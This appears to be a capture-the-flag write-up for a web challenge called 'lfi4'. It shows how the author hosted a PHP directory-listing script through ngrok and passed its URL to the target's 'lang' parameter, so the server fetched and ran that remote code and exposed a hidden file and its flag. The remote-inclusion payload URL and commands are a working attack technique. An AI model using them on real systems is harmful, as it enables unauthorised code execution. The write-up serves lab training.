# lfi4

## What it is

Same as the others, but we don't know what file the flag is in.

## Solution

We need to find the path to the file the flag is in.

We can do that by executing code from a remote file ([source](https://www.php.net/manual/en/features.remote-files.php)):

### Serving the remote file

This code will be executed on the server and print the files in the server's current directory:
```php
echo implode(", ", scandir("."))
```

We can make a simple http server with python3
```
python3 -m http.server 8080
```
```
$ curl localhost:8080/remote.php 
<?php
    echo implode(", ", scandir("."))
?>
```

To make it available to the server we can use [ngrok](https://ngrok.com/):
```
ngrok http 8080
```

### Executing the remote code

Url to execute the remote code:
```
https://remote.secu-web.blackfoot.dev/?lang=https://d84a-163-5-23-68.eu.ngrok.io/remote.php
```

This appears on the page:
```
., .., hidden_file.html, index.php 
```

At https://remote.secu-web.blackfoot.dev/hidden_file.html we find:
```
Congratz, you can validate with ZOB{sh0uld_h4v3_h1dd3n_b3773r}
```

flag: ```ZOB{sh0uld_h4v3_h1dd3n_b3773r}```
